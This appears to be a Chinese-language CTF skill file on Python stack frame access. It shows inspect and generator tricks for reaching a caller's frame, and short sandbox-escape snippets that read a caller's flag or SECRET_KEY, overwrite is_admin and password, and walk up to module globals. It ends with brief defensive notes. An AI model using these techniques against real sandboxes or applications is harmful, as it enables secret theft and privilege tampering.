---
name: python-frame-access
description: Use when encountering Python栈帧回溯 - inspect.currentframe、f_back访问调用者变量、生成器获取帧
---

# Python 栈帧访问

## Info

- **Domain**: web
- **Tags**: python, frame, inspect, sandbox-escape

## 1. 原理

Python 每次函数调用时创建栈帧，包含：

| 属性 | 说明 |
|------|------|
| `f_locals` | 局部变量字典 |
| `f_globals` | 全局变量字典 |
| `f_code` | 代码对象 |
| `f_back` | 上一帧指针（调用者） |

## 2. inspect 方法

```python
import inspect

def level3():
    frame = inspect.currentframe()
    # 局部变量
    print(frame.f_locals.keys())
    # 调用者函数名
    print(frame.f_back.f_code.co_name)  # → "level2"
    # 调用者的局部变量
    print(frame.f_back.f_locals)
    # 回溯到最外层
    root = frame
    while root.f_back:
        root = root.f_back
    print(root.f_globals.keys())  # 全局变量

def level2():
    x = "level2_var"
    level3()

def level1():
    y = "level1_var"
    level2()

level1()
```

调用栈结构：
```
┌─────────────────┐
│    main模块     │  ← 最底层 (f_globals)
├─────────────────┤
│     level1()    │  ← f_back → main
├─────────────────┤
│     level2()    │  ← f_back → level1
├─────────────────┤
│     level3()    │  ← 当前帧
└─────────────────┘
```

## 3. 生成器方法（无需 import）

```python
def get_caller_frame():
    def inner():
        yield g.gi_frame.f_back
    g = inner()
    my_frame = next(g)
    return my_frame.f_back

# 使用
def target():
    flag = "CTF{secret}"
    called_func()

def called_func():
    caller = get_caller_frame()
    print(caller.f_locals["flag"])  # → "CTF{secret}"
```

**优势**: 不需要导入 `inspect` 模块，在受限环境中更有用。

## 4. CTF 利用场景

### 读取调用者变量

```python
# 沙箱逃逸：读取上一层的 flag
def sandbox():
    flag = open("/flag").read()
    user_input()

def user_input():
    frame = inspect.currentframe().f_back
    print(frame.f_locals["flag"])
```

### 修改调用者变量

```python
def user_input():
    frame = inspect.currentframe().f_back
    frame.f_locals["is_admin"] = True
    frame.f_locals["password"] = "hacked"
```

### 访问全局变量

```python
def user_input():
    frame = inspect.currentframe()
    while frame.f_back:
        frame = frame.f_back
    # 现在 frame 是最外层模块帧
    print(frame.f_globals.get("SECRET_KEY"))
    print(frame.f_globals.get("FLAG"))
```

### 获取函数定义

```python
frame = inspect.currentframe().f_back
func = frame.f_globals.get("some_function")
# 访问函数的 globals
func_globals = func.__globals__
```

## 5. 防御/检测

- 沙箱中禁用 `inspect` 模块
- 过滤 `f_back`、`f_globals`、`f_locals` 属性访问
- 使用 `__builtins__` 清理
